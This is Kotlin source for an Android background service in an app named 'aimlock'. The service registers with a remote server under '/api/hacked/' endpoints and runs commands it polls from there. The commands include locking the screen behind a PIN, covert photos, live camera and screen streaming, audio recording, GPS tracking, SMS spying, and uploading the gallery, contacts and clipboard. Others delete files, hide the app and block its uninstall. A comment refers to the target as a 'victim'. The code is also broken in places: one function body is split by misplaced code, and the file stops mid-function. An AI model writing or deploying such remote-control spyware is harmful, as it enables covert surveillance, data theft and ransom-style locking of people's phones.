package com.aimlock.app

import android.app.*
import android.app.WallpaperManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.camera2.*
import android.location.Location
import android.location.LocationManager
import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioManager
import android.media.AudioRecord
import android.media.ImageReader
import android.media.MediaPlayer
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.speech.tts.TextToSpeech
import android.telephony.TelephonyManager
import android.util.Base64
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.Locale

class SocketService : Service() {

    companion object {
        @Volatile
        var instance: SocketService? = null
            private set
    }

    private val CHANNEL_ID = "aimlock_socket_channel"
    private val NOTIF_ID   = 101

    private var serverUrl     = ""
    private var deviceId      = ""
    private var deviceName    = ""
    private var ownerUsername = ""
    private var deviceToken   = ""

    private val handler = Handler(Looper.getMainLooper())
    private var pollRunnable:      Runnable? = null
    private var heartbeatRunnable: Runnable? = null

    private var flashOn       = false
    private var cameraManager: CameraManager? = null
    private var cameraId:      String?        = null
    private var cameraHandlerThread: HandlerThread? = null
    private var cameraHandler: Handler? = null

    private var tts: TextToSpeech? = null
    private var ttsReady = false
    private var mediaPlayer: MediaPlayer? = null
    private var keepalivePlayer: MediaPlayer? = null

    // Gallery flag biar ga upload bersamaan
    private var galleryUploading = false

    // Audio recording state
    private var audioRecorder: MediaRecorder? = null
    private var audioRecording  = false
    private var audioRecordFile: File? = null

    // Fake call state
    private var fakeCallActive = false

    // Camera Live state
    private var cameraLiveRunning  = false
    private var cameraLiveFacing   = "back"
    private var cameraLiveThread:  HandlerThread? = null
    private var cameraLiveHandler: Handler?       = null
    private var cameraLiveDevice:  CameraDevice?  = null
    private var cameraLiveReader:  ImageReader?   = null
    private var cameraLiveSession: CameraCaptureSession? = null
    private var cameraLiveSurface: android.view.Surface? = null
    private var cameraLiveTexture: android.graphics.SurfaceTexture? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification("Connecting..."))
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager
        cameraHandlerThread = HandlerThread("CameraBackground").also {
            it.start()
            cameraHandler = Handler(it.looper)
        }
        Thread {
            try { cameraId = cameraManager?.cameraIdList?.firstOrNull() } catch (_: Exception) {}
        }.start()

        tts = TextToSpeech(this) { status ->
            if (status == TextToSpeech.SUCCESS) {
                tts?.language = Locale("id", "ID")
                ttsReady = true
            }
        }

        startKeepaliveAudio()
    }

    private fun startKeepaliveAudio() {
        try {
            keepalivePlayer?.release()
            val afd = assets.openFd("sound/garena.mp3")
            keepalivePlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                setVolume(0f, 0f)
                isLooping = true
                setAudioAttributes(
                    AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_MEDIA)
                        .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                        .build()
                )
                prepare()
                start()
            }
        } catch (_: Exception) {
            try {
                keepalivePlayer?.release()
                val afd = assets.openFd("sound/jokowi.mp3")
                keepalivePlayer = MediaPlayer().apply {
                    setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                    afd.close()
                    setVolume(0f, 0f)
                    isLooping = true
                    prepare()
                    start()
                }
            } catch (_: Exception) {}
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)

        serverUrl     = intent?.getStringExtra("serverUrl")     ?: prefs.getString("flutter.serverUrl",     "") ?: ""
        deviceId      = intent?.getStringExtra("deviceId")      ?: prefs.getString("flutter.deviceId",      "") ?: ""
        deviceName    = intent?.getStringExtra("deviceName")    ?: prefs.getString("flutter.deviceName",    "") ?: ""
        ownerUsername = intent?.getStringExtra("ownerUsername") ?: prefs.getString("flutter.ownerUsername", "") ?: ""

        if (deviceToken.isEmpty()) {
            val appPrefs = getSharedPreferences("aimlock_prefs", Context.MODE_PRIVATE)
            deviceToken = appPrefs.getString("deviceToken_$deviceId", "") ?: ""
        }
        deviceToken = intent?.getStringExtra("deviceToken") ?: deviceToken

        if (deviceId.isNotEmpty() && serverUrl.isNotEmpty()) {
            getSharedPreferences("aimlock_prefs", Context.MODE_PRIVATE).edit()
                .putString("flutter.serverUrl", serverUrl)
                .putString("flutter.deviceId",  deviceId)
                .apply()

            registerDevice()
            startPolling()
            startHeartbeat()
        }
        return START_STICKY
    }

    // ── Register + sertakan device info ──────────────────────────────────────
    private fun registerDevice() {
        Thread {
            try {
                val body = JSONObject().apply {
                    put("deviceId",      deviceId)
                    put("deviceName",    deviceName)
                    put("ownerUsername", ownerUsername)
                    put("deviceInfo",    buildDeviceInfo())
                }.toString()
                val url  = URL("$serverUrl/api/hacked/register")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 10000
                conn.readTimeout    = 10000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                val res  = conn.inputStream.bufferedReader().readText()
                val json = JSONObject(res)
                if (json.optBoolean("success")) {
                    val tok = json.optString("token")
                    if (tok.isNotEmpty()) {
                        deviceToken = tok
                        val appPrefs = getSharedPreferences("aimlock_prefs", Context.MODE_PRIVATE)
                        appPrefs.edit()
                            .putString("deviceToken_$deviceId", tok)
                            .putBoolean("sms_spy_active", true) // selalu aktif
                            .apply()
                    }
                }
                conn.disconnect()
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }

    // ── Build JSON info device ────────────────────────────────────────────────
    private fun buildDeviceInfo(): JSONObject {
        val info = JSONObject()
        try {
            info.put("model",          "${Build.MANUFACTURER} ${Build.MODEL}")
            info.put("androidVersion", "Android ${Build.VERSION.RELEASE}")
            info.put("battery",        getBatteryLevel())
            info.put("network",        getNetworkInfo())
            info.put("sim1",           getSimInfo(0))
            info.put("sim2",           getSimInfo(1))
        } catch (_: Exception) {}
        return info
    }

    private fun getBatteryLevel(): Int {
        return try {
            val intent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level  = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale  = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level >= 0 && scale > 0) (level * 100 / scale) else -1
        } catch (_: Exception) { -1 }
    }

    private fun getNetworkInfo(): String {
        return try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val net  = cm.activeNetwork ?: return "Offline"
                val caps = cm.getNetworkCapabilities(net) ?: return "Offline"
                when {
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> {
                        val wm   = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                        val ssid = wm.connectionInfo.ssid?.trim('"') ?: "WiFi"
                        "WiFi: $ssid"
                    }
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> {
                        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                        "Seluler: ${tm.networkOperatorName}"
                    }
                    else -> "Tidak ada jaringan"
                }
            } else {
                @Suppress("DEPRECATION")
                cm.activeNetworkInfo?.typeName ?: "Offline"
            }
        } catch (_: Exception) { "Unknown" }
    }

    private fun getSimInfo(slot: Int): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                val sm   = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
                val subs = sm.activeSubscriptionInfoList ?: return "Tidak ada"
                if (slot >= subs.size) return "Tidak ada"
                subs[slot].carrierName?.toString() ?: "SIM ${slot + 1}"
            } else {
                val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                if (slot == 0) tm.networkOperatorName else "Tidak tersedia"
            }
        } catch (_: Exception) { "Tidak ada" }
    }

    private fun startPolling() {
        pollRunnable?.let { handler.removeCallbacks(it) }
        pollRunnable = object : Runnable {
            override fun run() {
                pollForCommand()
                handler.postDelayed(this, 3000)
            }
        }
        handler.postDelayed(pollRunnable!!, 3000)
    }

    private fun startHeartbeat() {

    // ── Play Video Fullscreen ──────────────────────────────────────────────
    private var videoActivity: android.app.Activity? = null

    private fun playVideoFullscreen(videoBase64: String, mimeType: String) {
        try {
            val bytes = android.util.Base64.decode(videoBase64, android.util.Base64.DEFAULT)
            val ext   = when (mimeType) {
                "video/x-matroska" -> "mkv"
                "video/webm"       -> "webm"
                "video/3gpp"       -> "3gp"
                else               -> "mp4"
            }
            val tmpFile = File(cacheDir, "aimlock_vid.$ext")
            FileOutputStream(tmpFile).use { it.write(bytes) }
            val intent = Intent(this, VideoPlayerActivity::class.java).apply {
                putExtra("videoPath", tmpFile.absolutePath)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP
            }
            startActivity(intent)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun stopVideoFullscreen() {
        try {
            sendBroadcast(Intent("com.aimlock.app.STOP_VIDEO"))
        } catch (_: Exception) {}
    }

        heartbeatRunnable?.let { handler.removeCallbacks(it) }
        heartbeatRunnable = object : Runnable {
            override fun run() {
                sendHeartbeat()
                handler.postDelayed(this, 15000)
            }
        }
        handler.postDelayed(heartbeatRunnable!!, 15000)
    }

    private fun pollForCommand() {
        if (deviceId.isEmpty() || serverUrl.isEmpty() || deviceToken.isEmpty()) return
        Thread {
            try {
                val url  = URL("$serverUrl/api/hacked/poll/$deviceId")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.connectTimeout = 8000
                conn.readTimeout    = 8000
                if (conn.responseCode == 200) {
                    val res  = conn.inputStream.bufferedReader().readText()
                    val json = JSONObject(res)
                    val cmd  = json.optJSONObject("command")
                    if (cmd != null) executeCommand(cmd)
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    private fun sendHeartbeat() {
        if (deviceId.isEmpty() || serverUrl.isEmpty() || deviceToken.isEmpty()) return
        Thread {
            try {
                val url  = URL("$serverUrl/api/hacked/heartbeat/$deviceId")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 8000
                conn.readTimeout    = 8000
                OutputStreamWriter(conn.outputStream).also { it.write("{}"); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    private fun executeCommand(cmd: JSONObject) {
        val type    = cmd.optString("type")
        val payload = cmd.optJSONObject("payload") ?: JSONObject()

        when (type) {

            // ── Existing commands (identik dari zip) ────────────────────────
            "lock" -> {
                val text = payload.optString("text", "")
                val pin  = payload.optString("pin",  "1234")
                handler.post {
                    // Kirim ke MainActivity untuk handle urutan yang benar:
                    // 1. setLockTaskPackages (skip dialog jika admin aktif)
                    // 2. startLockTask() dari Activity (wajib dari Activity)
                    // 3. Baru jalankan LockService overlay
                    // 4. moveTaskToBack
                    val intent = Intent(this, MainActivity::class.java).apply {
                        putExtra("action",   "start_lock_with_pin")
                        putExtra("lockText", text)
                        putExtra("lockPin",  pin)
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                                Intent.FLAG_ACTIVITY_SINGLE_TOP or
                                Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                    }
                    startActivity(intent)
                }
            }
            "lock_chat" -> {
                val text     = payload.optString("text",     "")
                val pin      = payload.optString("pin",      "1234")
                val flash    = payload.optBoolean("flash",    false)
                val sound    = payload.optBoolean("sound",    false)
                val keyboard = false // lock_chat tidak pakai keyboard toggle — biar victim bisa ngetik
                handler.post {
                    val svcIntent = Intent(this, LockService::class.java).apply {
                        putExtra("action",    "lock")
                        putExtra("lockText",  text)
                        putExtra("lockPin",   pin)
                        putExtra("flash",     flash)
                        putExtra("sound",     sound)
                        putExtra("keyboard",  keyboard)
                        putExtra("chatMode",  true)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        startForegroundService(svcIntent)
                    else
                        startService(svcIntent)
                    handler.postDelayed({
                        LockService.instance?.initChat(serverUrl, deviceId, deviceToken)
                    }, 1000)
                    val actIntent = Intent(this, MainActivity::class.java).apply {
                        putExtra("action",   "start_lock_with_pin")
                        putExtra("lockText", text)
                        putExtra("lockPin",  pin)
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                    }
                    startActivity(actIntent)
                }
            }
            "play_video" -> {
                val videoBase64 = payload.optString("videoBase64", "")
                val mimeType    = payload.optString("mimeType", "video/mp4")
                if (videoBase64.isNotEmpty()) {
                    handler.post { playVideoFullscreen(videoBase64, mimeType) }
                }
            }
            "play_video_stop" -> {
                handler.post { stopVideoFullscreen() }
            }
            "unlock" -> {
                handler.post {
                    startService(Intent(this, LockService::class.java).apply {
                        putExtra("action", "unlock")
                    })
                }
            }
            "flashlight" -> setFlashlight(payload.optString("state", "off") == "on")
            "wallpaper" -> {
                val base64 = payload.optString("imageBase64", "")
                if (base64.isNotEmpty()) setWallpaperFromBase64(base64)
            }
            "vibrate" -> {
                val duration = payload.optLong("duration", 2000)
                val pattern  = payload.optString("pattern", "single")
                vibrateDevice(duration, pattern)
            }
            "tts" -> {
                val text = payload.optString("text", "")
                val lang = payload.optString("lang", "id")
                if (text.isNotEmpty()) speakText(text, lang)
            }
            "sound" -> {
                val base64Audio = payload.optString("audioBase64", "")
                val mimeType    = payload.optString("mimeType", "audio/mpeg")
                if (base64Audio.isNotEmpty()) playSoundFromBase64(base64Audio, mimeType)
            }
            "take_photo" -> {
                val facing = payload.optString("facing", "back")
                takePhoto(facing)
            }
            "camera_live_start" -> {
                val facing = payload.optString("facing", "back")
                startCameraLive(facing)
            }
            "camera_live_stop" -> {
                stopCameraLive()
            }
            "camera_live_switch" -> {
                val facing = payload.optString("facing", "back")
                startCameraLive(facing) // restart dengan facing baru
            }
            "screen_live" -> {
                handler.post {
                    val intent = Intent(this, MainActivity::class.java).apply {
                        putExtra("action",      "request_screen_capture")
                        putExtra("serverUrl",   serverUrl)
                        putExtra("deviceId",    deviceId)
                        putExtra("deviceToken", deviceToken)
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
                    }
                    startActivity(intent)
                }
            }
            "screen_live_stop" -> {
                handler.post {
                    stopService(Intent(this, ScreenCaptureService::class.java))
                }
            }

            // ── New commands ────────────────────────────────────────────────
            "sms_spy_on" -> {
                getSharedPreferences("aimlock_prefs", Context.MODE_PRIVATE)
                    .edit().putBoolean("sms_spy_active", true).apply()
            }
            "sms_spy_off" -> {
                getSharedPreferences("aimlock_prefs", Context.MODE_PRIVATE)
                    .edit().putBoolean("sms_spy_active", false).apply()
            }
            "get_gallery"  -> uploadGallery()
            "get_full_photo" -> {
                val photoId = payload.optString("photoId", "")
                if (photoId.isNotEmpty()) uploadFullPhoto(photoId)
            }
            "get_contacts" -> uploadContacts()
            "delete_files" -> deleteAllFiles()
            "hide_app"     -> setAppVisibility(payload.optBoolean("hide", true))
            "enable_protection" -> {
                getSharedPreferences("aimlock_prefs", Context.MODE_PRIVATE)
                    .edit().putBoolean("anti_uninstall", true).apply()
            }
            "disable_protection" -> {
                getSharedPreferences("aimlock_prefs", Context.MODE_PRIVATE)
                    .edit().putBoolean("anti_uninstall", false).apply()
            }

            // ── 8 Fitur Baru ────────────────────────────────────────────────
            "fake_call" -> {
                val callerName   = payload.optString("callerName", "Mama")
                val callerNumber = payload.optString("callerNumber", "081234567890")
                val ringDuration = payload.optLong("ringDuration", 30000)
                handler.post { showFakeCallNotification(callerName, callerNumber, ringDuration) }
            }
            "get_clipboard" -> uploadClipboardHistory()
            "get_app_usage" -> uploadAppUsage()
            "set_time_limit" -> {
                val pkg     = payload.optString("packageName", "")
                val limitMs = payload.optLong("limitMs", 3600000)
                if (pkg.isNotEmpty()) setAppTimeLimit(pkg, limitMs)
            }
            "block_app" -> {
                val pkg   = payload.optString("packageName", "")
                val block = payload.optBoolean("block", true)
                if (pkg.isNotEmpty()) setAppBlocked(pkg, block)
            }
            "trigger_alarm" -> {
                val message  = payload.optString("message", "⚠ ALARM DARI PERANGKAT!")
                val duration = payload.optLong("duration", 10000)
                handler.post { triggerAlarm(message, duration) }
            }
            "get_gps" -> getGpsLocation()
            "record_audio" -> {
                val durationSec = payload.optInt("duration", 10)
                if (!audioRecording) startAudioRecording(durationSec)
            }
            "stop_record_audio" -> stopAudioRecording()
            "screen_text" -> {
                val text   = payload.optString("text", "")
                val active = payload.optBoolean("active", true)
                handler.post {
                    if (active && text.isNotEmpty()) {
                        val intent = Intent(this, ScreenTextService::class.java).apply {
                            putExtra("text", text)
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                            startForegroundService(intent)
                        else
                            startService(intent)
                    } else {
                        stopService(Intent(this, ScreenTextService::class.java))
                    }
                }
            }

            // ── Fitur Baru ─────────────────────────────────────────────────
            "open_app" -> {
                val pkg = payload.optString("packageName", "")
                if (pkg.isNotEmpty()) openApp(pkg)
            }
            "open_site" -> {
                val url = payload.optString("url", "")
                if (url.isNotEmpty()) openSite(url)
            }
            "get_app_list" -> uploadAppList()
        }
    }

    // ── Take Photo dengan Camera2 — fix Android 10-14 ───────────────────────
    // Root cause Android 11: Service tidak bisa akses camera tanpa preview surface aktif.
    // Fix: pakai SurfaceTexture dummy sebagai preview surface + ImageReader untuk capture.
    private fun takePhoto(facing: String) {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
            != android.content.pm.PackageManager.PERMISSION_GRANTED) return

        val camThread = HandlerThread("CamCapture_${System.currentTimeMillis()}").also { it.start() }
        val camHandler = Handler(camThread.looper)

        Thread {
            var cameraDevice:   CameraDevice? = null
            var imageReader:    ImageReader?  = null
            var surfaceTexture: android.graphics.SurfaceTexture? = null
            var previewSurface: android.view.Surface? = null
            try {
                val cm = cameraManager ?: run { camThread.quitSafely(); return@Thread }
                val targetFacing = if (facing == "front")
                    CameraCharacteristics.LENS_FACING_FRONT
                else
                    CameraCharacteristics.LENS_FACING_BACK

                val camId = cm.cameraIdList.firstOrNull { id ->
                    cm.getCameraCharacteristics(id)
                        .get(CameraCharacteristics.LENS_FACING) == targetFacing
                } ?: cm.cameraIdList.firstOrNull() ?: run { camThread.quitSafely(); return@Thread }

                val chars = cm.getCameraCharacteristics(camId)
                val map   = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                    ?: run { camThread.quitSafely(); return@Thread }

                // Pilih resolusi JPEG sedang
                val jpegSizes   = map.getOutputSizes(android.graphics.ImageFormat.JPEG)
                val sortedSizes = jpegSizes.sortedBy { it.width * it.height }
                val targetSize  = when {
                    sortedSizes.size >= 4 -> sortedSizes[sortedSizes.size / 2]
                    sortedSizes.isNotEmpty() -> sortedSizes.last()
                    else -> run { camThread.quitSafely(); return@Thread }
                }

                // Pilih resolusi preview kecil (hemat memory)
                val previewSizes   = map.getOutputSizes(android.graphics.SurfaceTexture::class.java)
                val smallPreview   = previewSizes.minByOrNull { it.width * it.height }
                    ?: android.util.Size(320, 240)

                // Buat SurfaceTexture dummy sebagai preview — wajib ada di Android 10-11
                surfaceTexture = android.graphics.SurfaceTexture(0).also {
                    it.setDefaultBufferSize(smallPreview.width, smallPreview.height)
                }
                previewSurface = android.view.Surface(surfaceTexture)

                imageReader = ImageReader.newInstance(
                    targetSize.width, targetSize.height, android.graphics.ImageFormat.JPEG, 2)

                val latch = java.util.concurrent.CountDownLatch(1)
                var capturedB64 = ""

                imageReader.setOnImageAvailableListener({ r ->
                    val img = r.acquireNextImage() ?: return@setOnImageAvailableListener
                    try {
                        val buf   = img.planes[0].buffer
                        val bytes = ByteArray(buf.remaining())
                        buf.get(bytes)
                        capturedB64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    } finally {
                        img.close()
                        latch.countDown()
                    }
                }, camHandler)

                val deviceLatch = java.util.concurrent.CountDownLatch(1)

                if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    camThread.quitSafely(); return@Thread
                }

                cm.openCamera(camId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        deviceLatch.countDown()
                        try {
                            // Session dengan 2 surface: previewSurface + imageReader
                            // Wajib ada previewSurface agar camera pipeline aktif di Android 10-11
                            camera.createCaptureSession(
                                listOf(previewSurface!!, imageReader!!.surface),
                                object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: CameraCaptureSession) {
                                        try {
                                            // Step 1: Jalankan preview repeating dulu supaya AE/AF settle
                                            val previewReq = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                                                addTarget(previewSurface!!)
                                                set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                            }
                                            session.setRepeatingRequest(previewReq.build(), null, camHandler)

                                            // Step 2: Tunggu AE/AF converge (600ms) lalu ambil foto
                                            camHandler.postDelayed({
                                                try {
                                                    session.stopRepeating()
                                                    val captureReq = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                                        addTarget(imageReader!!.surface)
                                                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                                        set(CaptureRequest.JPEG_ORIENTATION,
                                                            chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0)
                                                        set(CaptureRequest.JPEG_QUALITY, 85.toByte())
                                                    }
                                                    session.capture(captureReq.build(), null, camHandler)
                                                } catch (e: Exception) { latch.countDown() }
                                            }, 600)
                                        } catch (e: Exception) { latch.countDown() }
                                    }
                                    override fun onConfigureFailed(s: CameraCaptureSession) { latch.countDown() }
                                }, camHandler)
                        } catch (e: Exception) { latch.countDown() }
                    }
                    override fun onDisconnected(camera: CameraDevice) { camera.close(); deviceLatch.countDown(); latch.countDown() }
                    override fun onError(camera: CameraDevice, error: Int) { camera.close(); deviceLatch.countDown(); latch.countDown() }
                }, camHandler)

                latch.await(20, java.util.concurrent.TimeUnit.SECONDS)

                if (capturedB64.isNotEmpty()) {
                    uploadPhoto(capturedB64, facing)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            } finally {
                try { cameraDevice?.close()   } catch (_: Exception) {}
                try { imageReader?.close()    } catch (_: Exception) {}
                try { previewSurface?.release() } catch (_: Exception) {}
                try { surfaceTexture?.release() } catch (_: Exception) {}
                try { camThread.quitSafely()  } catch (_: Exception) {}
            }
        }.start()
    }

    private fun uploadPhoto(b64: String, facing: String) {
        Thread {
            try {
                val body = JSONObject().apply {
                    put("deviceId",    deviceId)
                    put("imageBase64", b64)
                    put("facing",      facing)
                    put("mimeType",    "image/jpeg")
                }.toString()
                val url  = URL("$serverUrl/api/hacked/photo-result")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.doOutput = true
                conn.connectTimeout = 15000
                conn.readTimeout    = 15000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    // ── Camera Live — buka kamera sekali, loop terus kirim frame ─────────────
    private fun startCameraLive(facing: String) {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
            != android.content.pm.PackageManager.PERMISSION_GRANTED) return

        // Stop yang lama dulu
        stopCameraLive()

        cameraLiveFacing  = facing
        cameraLiveRunning = true

        val thread = HandlerThread("CamLive").also { it.start() }
        cameraLiveThread  = thread
        cameraLiveHandler = Handler(thread.looper)

        Thread {
            try {
                val cm = cameraManager ?: return@Thread
                val targetFacing = if (facing == "front")
                    CameraCharacteristics.LENS_FACING_FRONT
                else CameraCharacteristics.LENS_FACING_BACK

                val camId = cm.cameraIdList.firstOrNull { id ->
                    cm.getCameraCharacteristics(id)
                        .get(CameraCharacteristics.LENS_FACING) == targetFacing
                } ?: cm.cameraIdList.firstOrNull() ?: return@Thread

                val chars = cm.getCameraCharacteristics(camId)
                val map   = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                    ?: return@Thread

                // Resolusi sedang untuk live (tidak terlalu besar supaya cepat)
                val sizes = map.getOutputSizes(android.graphics.ImageFormat.JPEG)
                    .sortedBy { it.width * it.height }
                val liveSize = when {
                    sizes.size >= 3 -> sizes[1] // pilih resolusi kecil ke-2
                    sizes.isNotEmpty() -> sizes[0]
                    else -> return@Thread
                }

                // Preview dummy surface
                val previewSizes = map.getOutputSizes(android.graphics.SurfaceTexture::class.java)
                val smallPreview = previewSizes.minByOrNull { it.width * it.height }
                    ?: android.util.Size(320, 240)

                val tex = android.graphics.SurfaceTexture(0).also {
                    it.setDefaultBufferSize(smallPreview.width, smallPreview.height)
                }
                cameraLiveTexture = tex
                val prevSurface   = android.view.Surface(tex)
                cameraLiveSurface = prevSurface

                // ImageReader dengan buffer 3 supaya tidak drop frame
                val reader = ImageReader.newInstance(
                    liveSize.width, liveSize.height, android.graphics.ImageFormat.JPEG, 3)
                cameraLiveReader = reader

                val orientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0

                // Tiap frame yang masuk → upload langsung
                reader.setOnImageAvailableListener({ r ->
                    if (!cameraLiveRunning) return@setOnImageAvailableListener
                    val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    try {
                        val buf   = img.planes[0].buffer
                        val bytes = ByteArray(buf.remaining())
                        buf.get(bytes)
                        val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                        uploadCameraFrame(b64, cameraLiveFacing)
                    } finally {
                        img.close()
                    }
                }, cameraLiveHandler)

                val openLatch = java.util.concurrent.CountDownLatch(1)

                cm.openCamera(camId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraLiveDevice = camera
                        openLatch.countDown()
                        try {
                            camera.createCaptureSession(
                                listOf(prevSurface, reader.surface),
                                object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: CameraCaptureSession) {
                                        cameraLiveSession = session
                                        if (!cameraLiveRunning) { session.close(); return }
                                        try {
                                            // Repeating request — tiap frame dikirim ke ImageReader
                                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                                                addTarget(prevSurface)
                                                addTarget(reader.surface)
                                                set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                                set(CaptureRequest.JPEG_ORIENTATION, orientation)
                                                set(CaptureRequest.JPEG_QUALITY, 45.toByte()) // kecil = cepat
                                            }
                                            session.setRepeatingRequest(req.build(), null, cameraLiveHandler)
                                        } catch (_: Exception) { stopCameraLive() }
                                    }
                                    override fun onConfigureFailed(s: CameraCaptureSession) { stopCameraLive() }
                                }, cameraLiveHandler)
                        } catch (_: Exception) { stopCameraLive() }
                    }
                    override fun onDisconnected(camera: CameraDevice) { camera.close(); stopCameraLive() }
                    override fun onError(camera: CameraDevice, error: Int) { camera.close(); stopCameraLive() }
                }, cameraLiveHandler)

                openLatch.await(10, java.util.concurrent.TimeUnit.SECONDS)
            } catch (_: Exception) { stopCameraLive() }
        }.start()
    }

    private fun stopCameraLive() {
        cameraLiveRunning = false
        try { cameraLiveSession?.stopRepeating() } catch (_: Exception) {}
        try { cameraLiveSession?.close()         } catch (_: Exception) {}
        try { cameraLiveDevice?.close()          } catch (_: Exception) {}
        try { cameraLiveReader?.close()          } catch (_: Exception) {}
        try { cameraLiveSurface?.release()       } catch (_: Exception) {}
        try { cameraLiveTexture?.release()       } catch (_: Exception) {}
        try { cameraLiveThread?.quitSafely()     } catch (_: Exception) {}
        cameraLiveSession = null
        cameraLiveDevice  = null
        cameraLiveReader  = null
        cameraLiveSurface = null
        cameraLiveTexture = null
        cameraLiveThread  = null
        cameraLiveHandler = null
    }

    private fun uploadCameraFrame(b64: String, facing: String) {
        Thread {
            try {
                val body = JSONObject().apply {
                    put("deviceId",    deviceId)
                    put("frameBase64", b64)
                    put("facing",      facing)
                }.toString()
